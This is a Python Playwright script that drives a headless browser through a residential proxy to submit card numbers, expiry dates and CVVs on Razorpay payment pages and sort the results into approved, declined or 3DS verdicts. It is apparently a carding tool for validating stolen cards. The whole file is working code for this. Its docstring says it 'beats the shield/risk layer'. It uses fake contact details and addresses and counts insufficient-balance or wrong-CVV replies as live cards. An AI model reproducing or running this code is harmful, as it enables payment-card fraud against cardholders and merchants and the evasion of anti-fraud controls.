"""Full browser walker for Razorpay payment pages — beats the shield/risk layer.

Runs a real chromium through the resi proxy and performs the entire payment like
a human: amount → Pay → contact → Cards → card form (typed, keystroke-delayed so
checkout.js formatters engage; name-on-card filled when the BIN asks for it) →
Continue → DCC "Pay ..." (foreign-card BINs) → RBI consent "Maybe later" (when
shown). checkout.js runs natively, so the shield payload, sardine fingerprint
and cookies are all genuine — the create/ajax POST passes the WAF and returns
REAL gateway verdicts.

Razorpay's checkout/order intermittently 500s (SERVER_ERROR) and corrupts the
order session (the DCC Pay click then does nothing) — the walker retries the
whole walk with a fresh browser when that happens and time remains.

Usage: python3 pay.py '<json>'
  json: {"site": "https://razorpay.me/@x", "card": "4111...", "mm": "12",
         "yy": "2029", "cvv": "123", "proxy_server": "...", "proxy_user": ...,
         "proxy_pass": ..., "name": "John Walker"}
Output on stdout: {"status": "...", "response": "...", "site": "...", "raw": "..."}
  status: APPROVED | DECLINED | REQUIRES_ACTION | SITE_FAIL | ERROR
"""
import sys, json, time, random


def out(obj):
    print(json.dumps(obj))
    sys.stdout.flush()
    sys.exit(0)


APPROVE_KEYS = ("insufficient_account_balance", "insufficient_balance", "account_balance_low",
                "cvv provided is incorrect", "incorrect_cvv", "invalid_cvv",
                "maximum transaction limit", "transaction_limit_exceeded")
AUTH_KEYS = ("requires_action", "authentication_required", "otp", "3ds", "two_factor", "2fa")


def map_verdict(err, raw):
    """Map a create/ajax error JSON to a verdict."""
    desc = str(err.get("description", "") or "")
    reason = str(err.get("reason", "") or "")
    dl, rl = desc.lower(), reason.lower()
    resp_text = (desc.replace(" Try another payment method or contact your bank for details.", "")
                .replace("Try another payment method or contact your bank for details.", "").strip()
                or reason or "Payment failed")
    if any(k in dl or k in rl for k in APPROVE_KEYS):
        return {"status": "APPROVED", "response": resp_text, "raw": raw}
    if any(k in dl or k in rl for k in AUTH_KEYS):
        return {"status": "REQUIRES_ACTION", "response": resp_text, "raw": raw}
    return {"status": "DECLINED", "response": resp_text, "raw": raw}


def parse_hits(hits):
    """Scan captured API responses for the first real verdict."""
    for h in reversed(hits):
        if h.get("seen"):
            continue
        h["seen"] = True
        body = h["body"]
        try:
            j = json.loads(body) if body.strip().startswith("{") else None
        except Exception:
            j = None
        if not isinstance(j, dict):
            continue
        err = j.get("error")
        if isinstance(err, dict):
            desc = str(err.get("description", "") or "")
            if "trouble completing" in desc.lower():
                return "SERVER_ERR", None
            if "server encountered an error" in desc.lower():
                return "AJAX_SERVER_ERR", None
            if "connection error" in desc.lower():
                # gateway↔issuer network failure — infrastructure, retryable
                return "GATEWAY_CONN_ERR", None
            return "VERDICT", map_verdict(err, body[:1500])
        st = str(j.get("status", "")).lower()
        if st in ("captured", "authorized", "paid"):
            return "VERDICT", {"status": "APPROVED", "response": "Charged ₹1.00 (Success)", "raw": body[:1500]}
        if j.get("next") or j.get("redirect") or "authenticate" in body.lower():
            return "VERDICT", {"status": "REQUIRES_ACTION", "response": "3DS/OTP Requires Action", "raw": body[:1500]}
        pid = j.get("payment_id") or j.get("id")
        # "active"/"pending"/"created" are non-final — the intent is still open
        # (e.g. the upfront UPI QR); keep polling for the real verdict
        if pid and st and st not in ("active", "pending", "created"):
            return "VERDICT", {"status": "DECLINED", "response": f"Payment {st}", "raw": body[:1500]}
    return None, None


class _WalkFail(Exception):
    def __init__(self, payload):
        super().__init__(payload)
        self.payload = payload


def walk_once(p, args, site, card, mm, yy, cvv, phone, email, name):
    """One full browser walk. Returns (verdict, server_errs) or raises _WalkFail."""
    proxy = {"server": args["proxy_server"]}
    if args.get("proxy_user"):
        proxy["username"] = args["proxy_user"]
        proxy["password"] = args.get("proxy_pass", "")
    b = p.chromium.launch(headless=True,
                          args=["--no-sandbox", "--disable-dev-shm-usage",
                                "--single-process", "--no-zygote", "--disable-gpu"],
                          proxy=proxy)
    pg = b.new_page(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                "AppleWebKit/537.36 (KHTML, like Gecko) "
                                "Chrome/131.0.0.0 Safari/537.36")

    api_hits = []
    server_errs = 0

    def on_resp(r):
        u = r.url
        if "api.razorpay.com" in u and ("create/ajax" in u or "checkout/order" in u or "payments/" in u):
            try:
                body = r.text()
            except Exception:
                return
            api_hits.append({"status": r.status, "url": u, "body": body[:3000]})

    pg.on("response", on_resp)

    try:
        # razorpay serves a dead canary build of the widget intermittently (empty
        # frame, no inputs) — reload until the checkout frame actually renders
        opened = False
        cf = None
        for _open_try in range(3):
            pg.goto(site, timeout=60000, wait_until="domcontentloaded")
            pg.wait_for_timeout(2500)
            amt = pg.query_selector("input[type=number]")
            pay_btn = pg.query_selector("input[type=button]")
            if not pay_btn:
                # fixed-amount pages (rzp.io links, pages.razorpay.com): no amount box —
                # click the visible Pay/Proceed/Next button directly
                for f in [pg] + [f for f in pg.frames if "razorpay" in f.url]:
                    got = f.evaluate("""() => {
                        for (const bt of document.querySelectorAll('button, input[type=button], a[role=button]')) {
                            const t = (bt.textContent || bt.value || '').trim();
                            if (/^(pay|proceed|next|pay now)/i.test(t) && bt.offsetParent) { bt.click(); return true; }
                        }
                        return false;
                    }""")
                    if got:
                        pay_btn = True
                        break
            if not amt and not pay_btn:
                raise _WalkFail({"status": "SITE_FAIL", "response": "not a payment page", "site": site, "raw": ""})
            if amt:
                amt.fill("1")
            if pay_btn is not True:
                pay_btn.click()
            pg.wait_for_timeout(6000)
            # poll for a checkout frame that actually renders content — the
            # canary build loads as an empty frame and never wakes up, a good
            # build can take a few extra seconds to paint; a "Couldn't verify"
            # rejection is deterministic for this IP → stop waiting
            rejected = False
            for _ in range(6):
                cf = next((f for f in pg.frames if "api.razorpay.com" in f.url and "checkout" in f.url), None)
                if cf and cf.evaluate("()=>!!(document.querySelector('input,button'))"):
                    opened = True
                    break
                if pg.evaluate("()=>{const e=[...document.querySelectorAll('div,span,p')].find(e=>e.offsetParent&&/couldn.t verify|request could not be verified/i.test(e.textContent||'')&&e.textContent.length<80);return e?1:0}"):
                    rejected = True
                    break
                pg.wait_for_timeout(2000)
            if opened:
                break
            if rejected:
                break
        if not opened:
            raise _WalkFail({"status": "SITE_FAIL", "response": "checkout did not open", "site": site, "raw": ""})

        # contact step (typed so the widget binds properly) — wait for the
        # widget to render first: builds can render the form several seconds
        # after the frame appears
        rendered = False
        for _ in range(6):
            if cf.query_selector("input[name=contact]"):
                rendered = True
                break
            if cf.query_selector("input[type=radio]"):
                break
            pg.wait_for_timeout(2000)
        if not (rendered or cf.query_selector("input[type=radio]")):
            raise _WalkFail({"status": "SITE_FAIL", "response": "checkout did not open", "site": site, "raw": ""})
        # type phone and advance — verify the widget actually left the contact
        # screen (the Continue click can land pre-bind); retry once otherwise
        for _c_try in range(2):
            if not cf.query_selector("input[name=contact]"):
                break
            try:
                cf.click("input[name=contact]", timeout=4000)
                cur = cf.evaluate("() => { const e = document.querySelector('input[name=contact]'); return e ? e.value : ''; }")
                if not cur:
                    cf.type("input[name=contact]", phone, delay=40)
                try:
                    cf.evaluate("() => { for (const bt of document.querySelectorAll('button')) if ((bt.textContent||'').trim() === 'Continue') { bt.click(); break; } }")
                except Exception:
                    cf.click("button:has-text('Continue')", timeout=5000)
            except Exception:
                pass
            pg.wait_for_timeout(6000)

        try:
            _dbg = cf.evaluate("""() => {
                const out = {inputs: [], buttons: [], radios: 0};
                for (const e of document.querySelectorAll('input')) if (e.offsetWidth) out.inputs.push((e.name || e.type) + '=' + (e.value||'').slice(0,18));
                for (const e of document.querySelectorAll('button')) if (e.offsetParent) out.buttons.push((e.textContent||'').trim().slice(0,20));
                for (const e of document.querySelectorAll('input[type=radio]')) if (e.offsetWidth) out.radios++;
                return out;
            }""")
            print("STAGE state:", json.dumps(_dbg)[:400], "frame:", cf.url[:80], flush=True)
        except Exception as _de:
            print("STAGE state EXC:", type(_de).__name__, flush=True)
        print("STAGE contact-done", flush=True)
        # card method — method list may still be rendering
        for _ in range(4):
            picked = cf.evaluate(r"""() => {
                for (const r of document.querySelectorAll('input[type=radio]')) {
                    if (!r.offsetWidth) continue;
                    let e = r.parentElement;
                    for (let i = 0; i < 5 && e; i++) {
                        const lab = (e.textContent || '').trim();
                        if (/^cards?\b/i.test(lab)) { r.click(); return true; }
                        e = e.parentElement;
                    }
                }
                return false;
            }""")
            print("STAGE radio try picked=", picked, flush=True)
            if picked:
                break
            try:
                _rd = cf.evaluate("""() => {
                    const out = [];
                    for (const r of document.querySelectorAll('input[type=radio]')) {
                        const e0 = r.parentElement;
                        out.push({vis: !!r.offsetWidth, t0: e0 ? (e0.textContent||'').trim().slice(0,20) : null});
                    }
                    return out;
                }""")
                print("STAGE radios:", json.dumps(_rd)[:300], flush=True)
            except Exception as _re2:
                print("STAGE radios EXC:", type(_re2).__name__, flush=True)
            pg.wait_for_timeout(2000)
        pg.wait_for_timeout(4000)
        print("STAGE radio-done", flush=True)
        # card form — type digits, let checkout.js format them
        num_sel = None
        for sel in ("input[name='card.number']", "input[name='card[number]']"):
            try:
                cf.wait_for_selector(sel, timeout=8000)
                num_sel = sel
                break
            except Exception:
                continue
        if not num_sel:
            # the radio click may have landed pre-render — re-click Cards and re-check
            for _ in range(2):
                cf.evaluate(r"""() => {
                    for (const r of document.querySelectorAll('input[type=radio]')) {
                        if (!r.offsetWidth) continue;
                        let e = r.parentElement;
                        for (let i = 0; i < 5 && e; i++) {
                            const lab = (e.textContent || '').trim();
                            if (/^cards?\b/i.test(lab)) { r.click(); return true; }
                            e = e.parentElement;
                        }
                    }
                    return false;
                }""")
                pg.wait_for_timeout(4000)
                for sel in ("input[name='card.number']", "input[name='card[number]']"):
                    try:
                        cf.wait_for_selector(sel, timeout=4000)
                        num_sel = sel
                        break
                    except Exception:
                        continue
                if num_sel:
                    break
        if not num_sel:
            raise _WalkFail({"status": "SITE_FAIL", "response": "card form did not render", "site": site, "raw": ""})
        print("STAGE numsel", num_sel, flush=True)
        dot = "card.number" in num_sel
        exp_sel = "input[name='card.expiry']" if dot else "input[name='card[expiry]']"
        cvv_sel = "input[name='card.cvv']" if dot else "input[name='card[cvv]']"
        cf.click(num_sel)
        cf.type(num_sel, card, delay=45)
        # the widget's formatter can race the last keystroke and drop a digit —
        # verify the value and repair via the native value setter
        try:
            cf.evaluate(r"""(c) => {
                const el = document.querySelector("input[name='card.number']");
                if (!el) return 'gone';
                const have = (el.value||'').replace(/\D/g,'');
                if (have.length === c.length) return 'ok';
                const s = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                s.call(el, c);
                el.dispatchEvent(new Event('input', {bubbles: true}));
                return 'fixed';
            }""", card)
        except Exception:
            pass
        try:
            cf.click(exp_sel)
            cf.type(exp_sel, f"{mm}{yy[-2:]}", delay=70)
        except Exception:
            pass
        try:
            cf.click(cvv_sel)
            cf.type(cvv_sel, cvv, delay=45)
        except Exception:
            pass
        # name on card — required for some BINs (e.g. Mastercard); when the field
        # is present, leaving it empty blocks the submit silently
        for nsel in ("input[name='card.name']", "input[name='card[name]']",
                     "input[placeholder*='name on card' i]", "input[placeholder*='cardholder' i]"):
            try:
                nf = cf.query_selector(nsel)
                if nf:
                    vis = cf.evaluate("(e)=>!!(e.offsetWidth||e.offsetHeight)", nf)
                    if vis:
                        cf.click(nsel)
                        cf.type(nsel, name, delay=30)
                        break
            except Exception:
                continue

        def bind_name_email():
            # JS value-setter fill: typing can fail to bind React state, which
            # blocks the submit silently — verify-and-fill name + card email
            for _ in range(3):
                try:
                    vals = cf.evaluate(r"""() => {
                        const nm = document.querySelector("input[name='card.name']");
                        const em = document.querySelector("input[name='email']");
                        return {n: nm ? nm.value : "", e: em ? em.value : ""};
                    }""")
                except Exception:
                    return
                if vals.get("n") and (vals.get("e") or not cf.query_selector("input[name='email']")):
                    return
                try:
                    cf.evaluate(r"""(n, e) => {
                        const setv = (el, v) => {
                            if (!el || el.value === v) return;
                            const s = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                            s.call(el, v);
                            el.dispatchEvent(new Event('input', {bubbles: true}));
                            el.dispatchEvent(new Event('change', {bubbles: true}));
                        };
                        setv(document.querySelector("input[name='card.name']"), n);
                        setv(document.querySelector("input[name='email']"), e);
                    }""", name, email)
                except Exception:
                    return
                pg.wait_for_timeout(600)
        bind_name_email()
        pg.wait_for_timeout(1000)

        def click_submit():
            return cf.evaluate(r"""() => {
                const btns = [...document.querySelectorAll('button')].filter(b => b.offsetParent && !b.disabled);
                for (const bt of btns) { const t=(bt.textContent||'').trim(); if (/^pay/i.test(t)) { bt.click(); return 'pay'; } }
                for (const bt of btns) { const t=(bt.textContent||'').trim(); if (t==='Continue') { bt.click(); return 'continue'; } }
                const subs = btns.filter(b => b.type==='submit' && !(b.textContent||'').trim());
                if (subs.length) { subs[subs.length-1].click(); return 'submit'; }
                return 'nopay';
            }""")

        def real_click():
            # trusted playwright click — the DCC "Pay ..." button ignores JS
            # .click() (react synthetic handler needs real mouse events)
            for sel in ("button:has-text('Pay')", "button:has-text('Continue')"):
                try:
                    cf.click(sel, timeout=2500)
                    return True
                except Exception:
                    continue
            return False

        # 1st submit — card form Continue (opens the DCC step for foreign BINs)
        try:
            _sub = click_submit()
            print("STAGE submit ret:", _sub, flush=True)
        except Exception as _e:
            _sub = None
            print("STAGE submit EXC:", type(_e).__name__, flush=True)
        pg.wait_for_timeout(4000)
        try:
            _st = cf.evaluate("""() => {
                const out = {btns: [], inputs: [], texts: []};
                for (const e of document.querySelectorAll('button')) if (e.offsetParent) out.btns.push((e.textContent||'').trim().slice(0,25));
                for (const e of document.querySelectorAll('input')) if (e.offsetWidth) out.inputs.push((e.name || e.type) + '=' + (e.value||'').slice(0,18));
                for (const e of document.querySelectorAll('div,span,p')) { const t=(e.textContent||'').trim(); if (t && t.length<90 && e.offsetParent && /valid|invalid|error|enter|required|declin|failed|exceed/i.test(t)) out.texts.push(t.slice(0,60)); }
                out.texts = [...new Set(out.texts)].slice(0,5);
                return out;
            }""")
            print("STAGE post-submit:", json.dumps(_st)[:600], flush=True)
        except Exception as _se:
            print("STAGE post-submit EXC:", type(_se).__name__, flush=True)
        # the first Continue can be silently blocked when the card email is
        # empty (guest checkout) — re-bind and re-submit once
        if cf.query_selector("input[name='card.number']"):
            bind_name_email()
            try:
                _sub2 = click_submit()
                print("STAGE resubmit ret:", _sub2, flush=True)
            except Exception:
                pass
            pg.wait_for_timeout(4000)
        for _ns in range(2):
            _txts = json.dumps(_st.get("texts", [])) if isinstance(_st, dict) else ""
            if "name on your card" not in _txts.lower() and "email" not in _txts.lower():
                break
            bind_name_email()
            pg.wait_for_timeout(800)
            try:
                click_submit()
            except Exception:
                pass
            pg.wait_for_timeout(4000)
            try:
                _st = cf.evaluate("""() => {
                    const out = [];
                    for (const e of document.querySelectorAll('div,span,p')) { const t=(e.textContent||'').trim(); if (t && t.length<90 && e.offsetParent && /valid|invalid|error|enter|required|declin|failed|exceed/i.test(t)) out.push(t.slice(0,60)); }
                    return [...new Set(out)].slice(0,5);
                }""")
                print("STAGE re-submit texts:", json.dumps(_st)[:300], flush=True)
            except Exception:
                break

        # interactive dance until create/ajax answers: DCC "Pay ..." → verify
        # payment address modal (country/state are full-picker modals) → RBI
        # "Save your card?" → create/ajax verdict
        def handle_address():
            for name, val in (("line1", args.get("line1") or "28 May Street 25"),
                              ("city", args.get("city") or "Baku"),
                              ("postal_code", args.get("zip") or "1000")):
                try:
                    cf.click(f"input[name={name}]", timeout=3000)
                    cf.type(f"input[name={name}]", val, delay=25)
                    pg.wait_for_timeout(300)
                except Exception:
                    pass
            # country: opens a full picker modal — search + click the row
            ctry = (args.get("addr_country") or "azerbaijan").lower()
            try:
                cf.click("input[name=country]", timeout=3000)
                pg.wait_for_timeout(1500)
                cf.fill("input[placeholder*='Search for a country']", ctry)
                pg.wait_for_timeout(1500)
                cf.evaluate("(c) => { const rows = [...document.querySelectorAll('div,button,li')].filter(e => e.offsetParent && !e.querySelector('div,button,li') && e.textContent.trim().toLowerCase() === c); if (rows.length) rows[0].click(); return rows.length; }", ctry)
                pg.wait_for_timeout(2000)
            except Exception:
                pass
            # state: picker/type after country is set
            st = (args.get("addr_state") or "baku").lower()
            try:
                cf.click("input[name=state]", timeout=3000)
                cf.type("input[name=state]", st, delay=25)
                pg.wait_for_timeout(1200)
                cf.evaluate("(s) => { const rows = [...document.querySelectorAll('div,button,li')].filter(e => e.offsetParent && !e.querySelector('div,button,li') && e.textContent.trim().toLowerCase().startsWith(s) && e.textContent.length < 50); if (rows.length) rows[0].click(); return rows.length; }", st)
            except Exception:
                pass
            pg.wait_for_timeout(1000)
            # modal Continue — last visible one
            cf.evaluate("() => { const btns = [...document.querySelectorAll('button')].filter(b => b.offsetParent && !b.disabled && (b.textContent||'').trim() === 'Continue'); if (btns.length) btns[btns.length-1].click(); }")

        verdict = None
        saw_ajax_err = False
        addr_done = False
        deadline = time.time() + 30
        while time.time() < deadline and verdict is None:
            pg.wait_for_timeout(2500)
            kind, res = parse_hits(api_hits)
            if kind == "VERDICT":
                verdict = res
                break
            if kind == "SERVER_ERR":
                server_errs += 1
            if kind == "AJAX_SERVER_ERR":
                saw_ajax_err = True
            if kind == "GATEWAY_CONN_ERR":
                # gateway↔issuer network failure — retry with a fresh session
                raise _WalkFail({"status": "SITE_FAIL", "response": "gateway connection error", "site": site, "raw": ""})
            # DCC pay button (trusted click required)
            try:
                has_pay = cf.evaluate("() => { const btns=[...document.querySelectorAll('button')].filter(b=>b.offsetParent&&!b.disabled); for (const bt of btns) { const t=(bt.textContent||'').trim(); if (/^pay/i.test(t)) return 1; } return 0; }")
                if has_pay:
                    real_click()
                    pg.wait_for_timeout(3000)
                    continue
            except Exception:
                pass
            # verify-payment-address modal
            try:
                has_addr = cf.evaluate("() => !!([...document.querySelectorAll('div,span,h2,h3')].find(e => e.offsetParent && /verify payment address/i.test(e.textContent||'') && e.textContent.length < 60))")
                if has_addr and not addr_done:
                    handle_address()
                    addr_done = True
                    pg.wait_for_timeout(3000)
                    continue
            except Exception:
                pass
            # RBI "Save your card?" modal → Maybe later
            try:
                rbi = cf.evaluate("() => { const btns=[...document.querySelectorAll('button')].filter(b=>b.offsetParent); for (const bt of btns) { const t=(bt.textContent||'').trim(); if (/maybe later/i.test(t)) { bt.click(); return 1; } } return 0; }")
                if rbi:
                    pg.wait_for_timeout(3000)
                    continue
            except Exception:
                pass

        if verdict:
            return verdict, server_errs
        if saw_ajax_err:
            # razorpay's server fails payment creation for this card — deterministic
            # across fresh sessions/currencies/amounts; typically an unsupported BIN
            return {"status": "DECLINED",
                    "response": "Payment creation failed — Razorpay SERVER_ERROR (card BIN not supported by Razorpay)",
                    "raw": ""}, server_errs

        # fall back to visible widget text
        try:
            texts = cf.evaluate("""() => {
                const out = [];
                for (const e of document.querySelectorAll('div,span,p')) {
                    const t = (e.textContent||'').trim();
                    if (!t || t.length > 200 || !e.offsetParent) continue;
                    const l = t.toLowerCase();
                    if (l.includes('declin')||l.includes('failed')||l.includes('incorrect')||l.includes('invalid')||l.includes('insufficient')||l.includes('otp')||l.includes('authenticat')||l.includes('success'))
                        out.push(t.slice(0,150));
                }
                return [...new Set(out)];
            }""")
        except Exception:
            texts = []
        if texts:
            tl = texts[0].lower()
            if any(k in tl for k in ("authenticat", "otp", "3ds", "secure", "verif")):
                st = "REQUIRES_ACTION"
            elif any(k in tl for k in ("success", "captured", "paid")):
                st = "APPROVED"
            else:
                st = "DECLINED"
            return {"status": st, "response": texts[0].strip(), "raw": json.dumps(texts)[:1500]}, server_errs

        raise _WalkFail({"status": "SITE_FAIL", "response": "no verdict captured", "site": site,
                         "raw": json.dumps(api_hits[-3:])[:1500] if api_hits else ""})
    finally:
        try:
            b.close()
        except Exception:
            pass


def main():
    args = json.loads(sys.argv[1])
    site = args["site"]
    card = args["card"]
    mm = args["mm"]
    yy = args["yy"]
    cvv = args["cvv"]
    if not args.get("proxy_server"):
        out({"status": "ERROR", "response": "proxy is MANDATORY — razorpay blocks datacenter IPs at checkout",
             "site": site, "raw": ""})
    phone = args.get("phone") or str(random.randint(6000000000, 9999999999))
    email = args.get("email") or f"walker{random.randint(100,999)}.rbx@gmail.com"
    name = args.get("name") or "John Walker"

    from playwright.sync_api import sync_playwright

    t0 = time.time()
    with sync_playwright() as p:
        attempt = 0
        while attempt < 2:
            attempt += 1
            try:
                verdict, server_errs = walk_once(p, args, site, card, mm, yy, cvv, phone, email, name)
                out({"status": verdict["status"], "response": verdict["response"],
                     "site": site, "raw": verdict["raw"]})
            except _WalkFail as wf:
                last = wf.payload
                # retry once on a corrupted order session (checkout/order 500)
                # while the subprocess budget (~100s) still allows it
                if attempt == 1 and time.time() - t0 < 50:
                    continue
                out(last)
            except Exception as e:
                last = {"status": "ERROR", "response": f"{type(e).__name__}: {str(e)[:120]}", "site": site, "raw": ""}
                if attempt == 1 and time.time() - t0 < 50:
                    continue
                out(last)
    out({"status": "SITE_FAIL", "response": "no verdict captured", "site": site, "raw": ""})


if __name__ == "__main__":
    main()
